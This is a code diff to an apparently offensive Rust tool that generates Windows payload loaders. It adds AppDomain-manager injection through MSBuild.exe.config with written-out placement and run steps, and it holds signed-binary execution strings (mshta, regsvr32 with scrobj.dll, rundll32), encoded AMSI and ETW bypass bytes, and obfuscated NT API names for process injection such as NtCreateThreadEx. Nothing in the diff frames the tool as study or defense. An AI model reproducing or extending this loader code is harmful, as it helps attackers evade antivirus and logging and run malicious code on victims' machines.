@@ -40,10 +40,10 @@ impl LoaderType {
     pub fn category(self) -> OutputCategory {
         use LoaderType::*;
         match self {
-            Binary | Dll | AppDomain | Injector | Rundll32 => OutputCategory::PeCompiled,
+            Binary | Dll | Injector | Rundll32 => OutputCategory::PeCompiled,
             Wsf | Hta | Regsvr32Sct | MsBuild | Cmstp | WmicXsl => OutputCategory::ScriptText,
             DocxMacro | XlsxMacro => OutputCategory::VbaText,
-            InstallUtil => OutputCategory::DotNetCompiled,
+            AppDomain | InstallUtil => OutputCategory::DotNetCompiled,
         }
     }
 
@@ -69,7 +69,12 @@ impl LoaderType {
             Binary | Injector => filename.to_string(),
             Dll => format!("rundll32 {},DllMain", filename),
             Rundll32 => format!("rundll32 {},EntryPoint", filename),
-            AppDomain => format!("Place {} + .config near host .exe; .NET loads it on startup", filename),
+            AppDomain => format!(
+                "1. Place {} and MSBuild.exe.config in \
+                 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\n\
+                 2. Run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+                filename
+            ),
             Wsf => format!("wscript.exe {}", filename),
             Hta => format!("mshta.exe {}", filename),
             Regsvr32Sct => format!("regsvr32 /u /s /n /i:{} scrobj.dll", filename),
@@ -106,13 +111,11 @@ pub struct PeConfig {
 
 #[derive(Debug, Clone, Serialize)]
 pub struct AppDomainConfig {
-    pub clr_version: String,
-    pub net_version: String,
-    pub target_process: String,
-    pub assembly_hex: String,
-    pub type_name: String,
-    pub method_name: String,
-    pub appdomain_name: String,
+    pub clr_version:   String,
+    pub net_version:   String,
+    pub assembly_name: String,
+    pub type_name:     String,
+    pub namespace:     String,
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -129,9 +132,10 @@ pub struct LoaderConfig {
 
 #[derive(Debug, Clone, Serialize)]
 pub struct AppDomainTemplateConfig {
-    pub clr_version: String,
-    pub net_version: String,
+    pub clr_version:   String,
+    pub net_version:   String,
     pub appdomain_name: String,
+    pub assembly_name:  String,
 }
 
 fn to_charcode_jscript(s: &str) -> String {
@@ -283,6 +287,7 @@ fn build_context(config: &LoaderConfig) -> Context {
         // NT function names — for byte-array export lookups in C# templates
         ("jsc_nt_alloc_vm",       "NtAllocateVirtualMemory"),
         ("jsc_nt_prot_vm",        "NtProtectVirtualMemory"),
+        ("jsc_nt_create_thread_ex", "NtCreateThreadEx"),
     ];
     for &(k, s) in jsc_pairs {
         vars.insert(k, to_charcode_jscript(s));
@@ -379,6 +384,14 @@ fn build_context(config: &LoaderConfig) -> Context {
     ctx.insert("amsi_enc_bytes", &amsi_enc);
     ctx.insert("etw_enc_bytes",  &etw_enc);
 
+    if let Some(ad) = &config.appdomain_config {
+        ctx.insert("appdomain_assembly_name", &ad.assembly_name);
+        ctx.insert("appdomain_type_name",     &ad.type_name);
+        ctx.insert("appdomain_namespace",     &ad.namespace);
+        ctx.insert("appdomain_clr_version",   &ad.clr_version);
+        ctx.insert("appdomain_net_version",   &ad.net_version);
+    }
+
     ctx
 }
 
@@ -390,7 +403,6 @@ pub fn generate_loader_source(config: &LoaderConfig) -> Result<String, String> {
         LoaderType::Binary    => "binary.rs.tera",
         LoaderType::Dll       => "dll.rs.tera",
         LoaderType::Rundll32  => "dll.rs.tera",
-        LoaderType::AppDomain => "appdomain.rs.tera",
         LoaderType::Injector  => "injector.rs.tera",
         other => return Err(format!("not a PE loader type: {:?}", other)),
     };
@@ -427,7 +439,12 @@ pub fn generate_vba_source(config: &LoaderConfig) -> Result<String, String> {
 pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
     let tera = build_tera()?;
     let ctx = build_context(config);
-    tera.render("csharp/installutil.cs.tera", &ctx).map_err(|e| e.to_string())
+    let template_name = match config.loader_type {
+        LoaderType::AppDomain   => "csharp/appdomain_manager.cs.tera",
+        LoaderType::InstallUtil => "csharp/installutil.cs.tera",
+        other => return Err(format!("not a .NET type: {:?}", other)),
+    };
+    tera.render(template_name, &ctx).map_err(|e| e.to_string())
 }
 
 pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
@@ -436,6 +453,7 @@ pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<Str
     ctx.insert("clr_version",    &config.clr_version);
     ctx.insert("net_version",    &config.net_version);
     ctx.insert("appdomain_name", &config.appdomain_name);
+    ctx.insert("assembly_name",  &config.assembly_name);
     tera.render("appdomain.config.tera", &ctx).map_err(|e| e.to_string())
 }
 
@@ -464,9 +482,10 @@ mod tests {
     #[test]
     fn test_appdomain_config_xml() {
         let config = AppDomainTemplateConfig {
-            clr_version: "v4.0.30319".into(),
-            net_version: "4.0".into(),
+            clr_version:   "v4.0.30319".into(),
+            net_version:   "4.0".into(),
             appdomain_name: "DefaultDomain".into(),
+            assembly_name: "DefaultLoader".into(),
         };
         let xml = generate_appdomain_config(&config).unwrap();
         assert!(xml.contains("v4.0.30319"));
